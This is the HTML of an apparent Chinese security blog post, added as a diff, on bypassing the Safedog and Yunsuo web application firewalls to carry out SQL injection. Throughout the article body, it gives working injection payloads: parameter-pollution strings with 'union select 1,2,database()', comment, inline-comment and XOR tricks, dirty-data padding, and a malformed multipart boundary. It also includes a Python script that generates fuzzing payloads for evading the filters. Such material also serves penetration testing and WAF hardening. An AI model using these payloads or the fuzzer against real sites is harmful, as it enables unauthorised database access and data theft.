@@ -1,0 +1,708 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="self_209&#39;blog">
+    <title>waf bypass (sql) - self_209&#39;blog</title>
+    <meta name="author" content="self_209">
+    
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"安全狗、云锁waf绕过\n\n\n\n\nbypass 安全狗\n注释符绕过and or 可以使用异或绕过，也可以使用多行注释绕过\n\n异或绕过\n\n多行注释绕过\n\nunion select使用多行注释代替空格绕过\n\nunion/*{fuzz}*/select\n\n\n\n函数绕过就在括号前插入即可绕过\n\n\n分块传输绕过分块传输绕过使用burp插件即可。\n\n插件地址：https://github.com/c0ny1/chunked-coding-converter\n\n\n\n\n参数污染配合注释符绕过正常的参数污染是没办法绕过的，还需要配合注释符欺骗waf。\n\n配合注释符欺骗waf\n\n?id=1–+%23%0a/*&amp;id=-2+union+select+1,2,database()–+*/\n\n\n还有一种\n\n?name=abc–+%23%0a/*&amp;id=-2+union+select+1,2,database()&amp;*/pass=abc\n\n\n\n内联注释绕过内联注释（/*!*/）当!后面没有接版本号时，会直接执行里面内容。当!后面接数据库版本号时并且自身版本号大于等于数字，就会将注释中的内容执行，否则就会当做注释来处理。\n内联注释没法绕过union select，但是可以绕过函数过滤。在括号前插入内联注释，！后面的数字要大于自身版本号，就可以绕过敏感函数。\n\nlike、REGEXP匹配注释符绕过like\nlike关键字可看作是一个精简的正则表达式功能。主要是针对字符型字段的，在一个字符型字段列中检索包含对应子串的。\n1select * from 表名 where 字段名 like 对应值（子串）\n\n当我们检索注释符的时候，waf会认为是注释符那么注释符之后的sql语句waf就会认为没有威胁，从而导致绕过。\n\n–%20 、%23\n\n敏感函数也可以用%0a绕过\n\n\n\nREGEXP\n正则表达式用来匹配文本的特殊的串(字符集合)(匹配文本、将一个模式(正则表达式)与一个文本患进行比较)\n与like差不多，只不过这里只能用%23\n\n脏数据绕过脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。\n用脏数据代替空格\n\nunion{/*脏数据*/}select{/*脏数据*/}     \n函数：\ndatabase{/*脏数据*/}()\nuser{/*脏数据*/}()\n\n\nhttp Content-Type绕过将http Content-Type类型改为multipart/form-data\n\n\n\nbypass 云锁\n注释配合空白字符绕过云锁对and or 并不拦截，对内联注释和多行注释过滤相当严格，尝试很多都没能绕过，最后参考别的师傅的文章运用单行注释配合空白字符进行绕过。\n\n\n空白字符：\n\n1&#x27;%20&#x27;, &#x27;%09&#x27;, &#x27;%0a&#x27;, &#x27;%0b&#x27;, &#x27;%0c&#x27;, &#x27;%0d&#x27;, &#x27;%a0&#x27;, &#x27;%5C%4E&#x27;, &#x27;\\\\N&#x27;\n\n单行注释：\n\n1&#x27;%2D%2D%2B&#x27;, &#x27;%2D%2D%20%2D&#x27;, &#x27;%2D%2D%0a%2D&#x27;\n\n对单行注释和空白字符进行组合成fuzz字典，在union select前面进行fuzz。\n123456789101112131415import itertoolsList = [&#x27;%20&#x27;, &#x27;%09&#x27;, &#x27;%0a&#x27;, &#x27;%0b&#x27;, &#x27;%0c&#x27;, &#x27;%0d&#x27;, &#x27;%2d%2d&#x27;, &#x27;%23&#x27;, &#x27;%a0&#x27;, &#x27;%2D%2D%2B&#x27;, &#x27;%5C%4E&#x27;, &#x27;\\\\N&#x27;, &#x27;/%2A/&#x27;, &#x27;%2D%2D%20%2D&#x27;, &#x27;%2D%2D%0a%2D&#x27;, &#x27;/%2A%2A/&#x27;]count = 0num = 3for i in itertools.product(List, repeat=num):    count += 1    combination = &#x27;&#x27;.join(i)    payload = &#x27;&#123;&#125;&#x27;.format(combination)    print(payload)\n\n\n\n\n使用单行注释配合空白字符绕过，之后的语句都不会被拦截\n\n\nhttp Content-Type畸形boundary绕过将http Content-Type类型改为multipart/form-data，并且在boundary值后面加上分号后面加任意字符就可以绕过，具体绕过原理不太清楚。\n\n\n不使用畸形boundary无法绕过\n\n\n\n脏数据绕过脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。\n用脏数据代替空格\n\nunion{/*脏数据*/}select{/*脏数据*/}     \n函数：\ndatabase{/*脏数据*/}()\nuser{/*脏数据*/}()\n\n\n\n","dateCreated":"2022-06-20T13:55:36+08:00","dateModified":"2022-06-20T18:45:25+08:00","datePublished":"2022-06-20T13:55:36+08:00","description":"安全狗、云锁waf绕过","headline":"waf bypass (sql)","image":[null,"103533.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2022/06/20/20220620/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2022/06/20/20220620/","keywords":"bypass","thumbnailUrl":"103533.jpg"}</script>
+    <meta name="description" content="安全狗、云锁waf绕过">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="waf bypass (sql)">
+<meta property="og:url" content="https://self209.github.io/2022/06/20/20220620/index.html">
+<meta property="og:site_name" content="self_209&#39;blog">
+<meta property="og:description" content="安全狗、云锁waf绕过">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153839060.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620154623324.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620154704334.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620154841942.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620160738143.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620160700294.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620160956630.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161116084.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161523645.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161556470.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161655772.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161940122.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620162240135.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620162641105.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620162738583.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620172635268.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620180048836.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620180312759.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620180520129.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620181313450.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620182038748.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620183039621.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620183056033.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620182908799.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153451484.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620145038209.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620152248937.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620144832812.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620144904696.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620144719753.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620145844739.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620150016116.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620150223887.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620150427437.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620152415087.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620151104438.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620151217346.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153025275.png">
+<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620152023116.png">
+<meta property="article:published_time" content="2022-06-20T05:55:36.000Z">
+<meta property="article:modified_time" content="2022-06-20T10:45:25.786Z">
+<meta property="article:author" content="self_209">
+<meta property="article:tag" content="bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153839060.png">
+    
+    
+        
+    
+    
+    
+    
+        <meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/103533.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2022/06/20/20220620/103533.jpg"/>
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gt5qcce6mgvuqwcgifha2ylts94nspkxjckwcuei5fxp2ypavhmsle0ivz1f.min.css">
+
+    <!--STYLES END-->
+    
+
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            self_209&#39;blog
+        </a>
+    </div>
+    
+        
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/self209"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:2662686939@qq.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    "
+             style="background-image:url('/2022/06/20/20220620/103533.jpg');"
+             data-behavior="5">
+            
+                <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            waf bypass (sql)
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2022-06-20T13:55:36+08:00">
+	
+		    6月 20, 2022
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+
+            
+        </div>
+
+            <div id="main" data-behavior="5"
+                 class="hasCover
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>安全狗、云锁waf绕过</p>
+<span id="more"></span>
+
+<h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-%E5%AE%89%E5%85%A8%E7%8B%97"><span class="toc-text">bypass 安全狗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">注释符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87"><span class="toc-text">分块传输绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E9%85%8D%E5%90%88%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">参数污染配合注释符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#like%E3%80%81REGEXP%E5%8C%B9%E9%85%8D%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">like、REGEXP匹配注释符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87"><span class="toc-text">脏数据绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-Content-Type%E7%BB%95%E8%BF%87"><span class="toc-text">http Content-Type绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-%E4%BA%91%E9%94%81"><span class="toc-text">bypass 云锁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E9%85%8D%E5%90%88%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">注释配合空白字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-Content-Type%E7%95%B8%E5%BD%A2boundary%E7%BB%95%E8%BF%87"><span class="toc-text">http Content-Type畸形boundary绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87-1"><span class="toc-text">脏数据绕过</span></a></li></ol></li></ol>
+
+<h2 id="bypass-安全狗"><a href="#bypass-安全狗" class="headerlink" title="bypass 安全狗"></a>bypass 安全狗</h2><p><img src="image-20220620153839060.png" alt="image-20220620153839060"></p>
+<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>and or 可以使用异或绕过，也可以使用多行注释绕过</p>
+<p><img src="image-20220620154623324.png" alt="image-20220620154623324"></p>
+<p>异或绕过</p>
+<p><img src="image-20220620154704334.png" alt="image-20220620154704334"></p>
+<p>多行注释绕过</p>
+<p><img src="image-20220620154841942.png" alt="image-20220620154841942"></p>
+<p>union select使用多行注释代替空格绕过</p>
+<blockquote>
+<p>union/*{fuzz}*/select</p>
+</blockquote>
+<p><img src="image-20220620160738143.png" alt="image-20220620160738143"></p>
+<p><img src="image-20220620160700294.png" alt="image-20220620160700294"></p>
+<p>函数绕过就在括号前插入即可绕过</p>
+<p><img src="image-20220620160956630.png" alt="image-20220620160956630"></p>
+<p><img src="image-20220620161116084.png" alt="image-20220620161116084"></p>
+<h3 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h3><p>分块传输绕过使用burp插件即可。</p>
+<blockquote>
+<p>插件地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
+</blockquote>
+<p><img src="image-20220620161523645.png" alt="image-20220620161523645"></p>
+<p><img src="image-20220620161556470.png" alt="image-20220620161556470"></p>
+<p><img src="image-20220620161655772.png" alt="image-20220620161655772"></p>
+<h3 id="参数污染配合注释符绕过"><a href="#参数污染配合注释符绕过" class="headerlink" title="参数污染配合注释符绕过"></a>参数污染配合注释符绕过</h3><p>正常的参数污染是没办法绕过的，还需要配合注释符欺骗waf。</p>
+<p><img src="image-20220620161940122.png" alt="image-20220620161940122"></p>
+<p>配合注释符欺骗waf</p>
+<blockquote>
+<p>?id=1–+%23%0a/*&amp;id=-2+union+select+1,2,database()–+*/</p>
+</blockquote>
+<p><img src="image-20220620162240135.png" alt="image-20220620162240135"></p>
+<p>还有一种</p>
+<blockquote>
+<p>?name=abc–+%23%0a/*&amp;id=-2+union+select+1,2,database()&amp;*/pass=abc</p>
+</blockquote>
+<p><img src="image-20220620162641105.png" alt="image-20220620162641105"></p>
+<p><img src="image-20220620162738583.png" alt="image-20220620162738583"></p>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>内联注释（/*!*/）当!后面没有接版本号时，会直接执行里面内容。当!后面接数据库版本号时并且自身版本号大于等于数字，就会将注释中的内容执行，否则就会当做注释来处理。</p>
+<p>内联注释没法绕过union select，但是可以绕过函数过滤。在括号前插入内联注释，！后面的数字要大于自身版本号，就可以绕过敏感函数。</p>
+<p><img src="image-20220620172635268.png" alt="image-20220620172635268"></p>
+<h3 id="like、REGEXP匹配注释符绕过"><a href="#like、REGEXP匹配注释符绕过" class="headerlink" title="like、REGEXP匹配注释符绕过"></a>like、REGEXP匹配注释符绕过</h3><p><strong>like</strong></p>
+<p>like关键字可看作是一个精简的正则表达式功能。主要是针对字符型字段的，在一个字符型字段列中检索包含对应子串的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where 字段名 like 对应值（子串）</span><br></pre></td></tr></table></figure>
+
+<p>当我们检索注释符的时候，waf会认为是注释符那么注释符之后的sql语句waf就会认为没有威胁，从而导致绕过。</p>
+<blockquote>
+<p>–%20 、%23</p>
+</blockquote>
+<p>敏感函数也可以用%0a绕过</p>
+<p><img src="image-20220620180048836.png" alt="image-20220620180048836"></p>
+<p><img src="image-20220620180312759.png" alt="image-20220620180312759"></p>
+<p><img src="image-20220620180520129.png" alt="image-20220620180520129"></p>
+<p><strong>REGEXP</strong></p>
+<p>正则表达式用来匹配文本的特殊的串(字符集合)(匹配文本、将一个模式(正则表达式)与一个文本患进行比较)</p>
+<p>与like差不多，只不过这里只能用%23</p>
+<p><img src="image-20220620181313450.png" alt="image-20220620181313450"></p>
+<h3 id="脏数据绕过"><a href="#脏数据绕过" class="headerlink" title="脏数据绕过"></a>脏数据绕过</h3><p>脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。</p>
+<p>用脏数据代替空格</p>
+<blockquote>
+<p>union{/*脏数据*/}select{/*脏数据*/}     </p>
+<p>函数：</p>
+<p>database{/*脏数据*/}()</p>
+<p>user{/*脏数据*/}()</p>
+</blockquote>
+<p><img src="image-20220620182038748.png" alt="image-20220620182038748"></p>
+<h3 id="http-Content-Type绕过"><a href="#http-Content-Type绕过" class="headerlink" title="http Content-Type绕过"></a>http Content-Type绕过</h3><p>将http Content-Type类型改为multipart/form-data</p>
+<p><img src="image-20220620183039621.png" alt="image-20220620183039621"></p>
+<p><img src="image-20220620183056033.png" alt="image-20220620183056033"></p>
+<p><img src="image-20220620182908799.png" alt="image-20220620182908799"></p>
+<h2 id="bypass-云锁"><a href="#bypass-云锁" class="headerlink" title="bypass 云锁"></a>bypass 云锁</h2><p><img src="image-20220620153451484.png" alt="image-20220620153451484"></p>
+<h3 id="注释配合空白字符绕过"><a href="#注释配合空白字符绕过" class="headerlink" title="注释配合空白字符绕过"></a>注释配合空白字符绕过</h3><p>云锁对and or 并不拦截，对内联注释和多行注释过滤相当严格，尝试很多都没能绕过，最后参考别的师傅的文章运用单行注释配合空白字符进行绕过。</p>
+<p><img src="image-20220620145038209.png" alt="image-20220620145038209"></p>
+<p><img src="image-20220620152248937.png" alt="image-20220620152248937"></p>
+<p>空白字符：</p>
+<blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%20&#x27;</span>, <span class="string">&#x27;%09&#x27;</span>, <span class="string">&#x27;%0a&#x27;</span>, <span class="string">&#x27;%0b&#x27;</span>, <span class="string">&#x27;%0c&#x27;</span>, <span class="string">&#x27;%0d&#x27;</span>, <span class="string">&#x27;%a0&#x27;</span>, <span class="string">&#x27;%5C%4E&#x27;</span>, <span class="string">&#x27;\\N&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>单行注释：</p>
+<blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%2D%2D%2B&#x27;</span>, <span class="string">&#x27;%2D%2D%20%2D&#x27;</span>, <span class="string">&#x27;%2D%2D%0a%2D&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>对单行注释和空白字符进行组合成fuzz字典，在union select前面进行fuzz。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="type">List</span> = [<span class="string">&#x27;%20&#x27;</span>, <span class="string">&#x27;%09&#x27;</span>, <span class="string">&#x27;%0a&#x27;</span>, <span class="string">&#x27;%0b&#x27;</span>, <span class="string">&#x27;%0c&#x27;</span>, <span class="string">&#x27;%0d&#x27;</span>, <span class="string">&#x27;%2d%2d&#x27;</span>, <span class="string">&#x27;%23&#x27;</span>, <span class="string">&#x27;%a0&#x27;</span>, <span class="string">&#x27;%2D%2D%2B&#x27;</span>, <span class="string">&#x27;%5C%4E&#x27;</span>, <span class="string">&#x27;\\N&#x27;</span>, <span class="string">&#x27;/%2A/&#x27;</span>, <span class="string">&#x27;%2D%2D%20%2D&#x27;</span>, <span class="string">&#x27;%2D%2D%0a%2D&#x27;</span>, <span class="string">&#x27;/%2A%2A/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">num = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="type">List</span>, repeat=num):</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    combination = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    payload = <span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(combination)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220620144832812.png" alt="image-20220620144832812"></p>
+<p><img src="image-20220620144904696.png" alt="image-20220620144904696"></p>
+<p><img src="image-20220620144719753.png" alt="image-20220620144719753"></p>
+<p>使用单行注释配合空白字符绕过，之后的语句都不会被拦截</p>
+<p><img src="image-20220620145844739.png" alt="image-20220620145844739"></p>
+<p><img src="image-20220620150016116.png" alt="image-20220620150016116"></p>
+<h3 id="http-Content-Type畸形boundary绕过"><a href="#http-Content-Type畸形boundary绕过" class="headerlink" title="http Content-Type畸形boundary绕过"></a>http Content-Type畸形boundary绕过</h3><p>将http Content-Type类型改为multipart/form-data，并且在boundary值后面加上分号后面加任意字符就可以绕过，具体绕过原理不太清楚。</p>
+<p><img src="image-20220620150223887.png" alt="image-20220620150223887"></p>
+<p><img src="image-20220620150427437.png" alt="image-20220620150427437"></p>
+<p>不使用畸形boundary无法绕过</p>
+<p><img src="image-20220620152415087.png" alt="image-20220620152415087"></p>
+<p><img src="image-20220620151104438.png" alt="image-20220620151104438"></p>
+<p><img src="image-20220620151217346.png" alt="image-20220620151217346"></p>
+<h3 id="脏数据绕过-1"><a href="#脏数据绕过-1" class="headerlink" title="脏数据绕过"></a>脏数据绕过</h3><p>脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。</p>
+<p>用脏数据代替空格</p>
+<blockquote>
+<p>union{/*脏数据*/}select{/*脏数据*/}     </p>
+<p>函数：</p>
+<p>database{/*脏数据*/}()</p>
+<p>user{/*脏数据*/}()</p>
+</blockquote>
+<p><img src="image-20220620153025275.png" alt="image-20220620153025275"></p>
+<p><img src="image-20220620152023116.png" alt="image-20220620152023116"></p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/bypass/" rel="tag">bypass</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/02/25/20220225/"
+                    data-tooltip="内网安全之kerberos(二)"
+                    aria-label="下一篇: 内网安全之kerberos(二)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/06/20/20220620/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/06/20/20220620/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2022 self_209. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
